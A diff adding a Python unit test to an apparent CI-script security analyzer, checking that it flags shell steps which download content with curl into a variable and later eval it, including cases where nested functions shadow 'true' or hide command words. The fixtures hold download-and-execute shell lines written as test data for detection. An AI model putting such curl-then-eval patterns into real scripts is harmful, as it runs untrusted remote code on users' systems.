@@ -2171,6 +2171,44 @@ class TestADownloadCarriedInAVariable(unittest.TestCase):
                         reason.startswith("runs `eval` on `$X`") for reason in why
                     ), why)
 
+    def test_2437_nested_proof_inputs_are_depth_blind(self):
+        # Review round seven: a function definition folded into an outer body's stage can
+        # shadow a status command or hide a dynamic command word.  Neither can support the
+        # proof that a later assignment certainly replaces the downloaded value.
+        reports = (
+            ("W609b nested shadowed true",
+             "f() { readonly X; }\ng() { true() { return 1; }; true || f; }\ng\n"),
+            ("W616 nested dynamic command",
+             "g() { h() { $F; }; h; }\nF=f\nf() { readonly X; }\ng\n"),
+        )
+        get = "X=$(curl -fsSL https://e.test/x)\n"
+        for name, middle in reports:
+            for shell in self.SHELLS:
+                with self.subTest(row=name, shell=shell):
+                    why = [str(reason) for _step, reason in wg.job_defects([
+                        wg.Step("run", get + middle + 'X=safe\neval "$X"\n', shell)
+                    ])]
+                    self.assertEqual(1, sum(
+                        reason.startswith("runs `eval` on `$X`") for reason in why
+                    ), why)
+
+        # The shared enumeration retains the same-shell boundary: calls made in a pipeline,
+        # in the background, or from a parenthesized function body cannot make X readonly here.
+        clean = (
+            ("W617 nested pipeline",
+             "f() { readonly X; }\ng() { h() { f | cat; }; h; }\ng\n"),
+            ("W618 nested background",
+             "f() { readonly X; }\ng() { h() { f & wait; }; h; }\ng\n"),
+            ("W621 parenthesized nested body",
+             "f() { readonly X; }\ng() { h() ( f ); h; }\ng\n"),
+        )
+        for name, middle in clean:
+            for shell in self.SHELLS:
+                with self.subTest(row=name, shell=shell):
+                    self.assertEqual([], wg.job_defects([
+                        wg.Step("run", get + middle + 'X=safe\neval "$X"\n', shell)
+                    ]))
+
     def test_2437_round_five_keeps_proved_dead_and_child_controls_clean(self):
         get = "X=$(curl -fsSL https://e.test/x)\n"
         middles = (
